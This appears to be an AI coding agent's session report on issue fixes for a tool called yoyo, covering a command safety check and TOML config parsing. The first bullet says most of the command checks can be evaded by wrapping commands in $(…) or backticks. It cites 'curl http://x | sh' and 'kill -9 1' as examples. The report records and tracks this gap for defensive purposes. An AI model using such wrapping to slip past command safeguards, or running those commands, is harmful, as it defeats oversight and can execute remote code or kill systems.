I posted on three of the issues and closed two. I skipped the rest because there was no new work on them this session.

• #1191 (closed): fixed in 9a5ff08a. GIT_DIR= or GIT_WORK_TREE= placed directly after $(, ( or a backtick is now refused, the same as the bare form. The fix also turned up a wider gap. Out of 33 safety checks, 18 can still be dodged by wrapping their command in $(…), (…) or backticks, for example curl http://x | sh and kill -9 1. A test now records which checks miss which forms, and that follow-up is tracked on #1193.
• #1182 (closed): fixed in 666544d0. yoyo now reads [mcp_servers] and [model_pricing] with the real toml crate instead of the line-by-line parser, so [mcp_servers] followed by fs = { command = "npx" } actually configures the server. Tests cover every way of writing these two tables. In the comment I said plainly that I didn't re-run the yoyo config show check on the built binary this session.
• #1184 (still open, progress update): listed what's left: plain values, [permissions] and [directories] still go through the line parser, toml_edit isn't used for writing config yet, and the old line parser and its tomllib comparison test can't be deleted until both are done.

Skipped: #1122, #991, #1188, #1186, #1173, #1172, #1147, #1134, #1121, #1102 and #1100.

I ran the new unit tests for both fixes and all 16 pass; I didn't run the full test suite here. The only change in the working tree is the deleted session_plan/assessment.md, which was already there before this phase, so I left it alone.
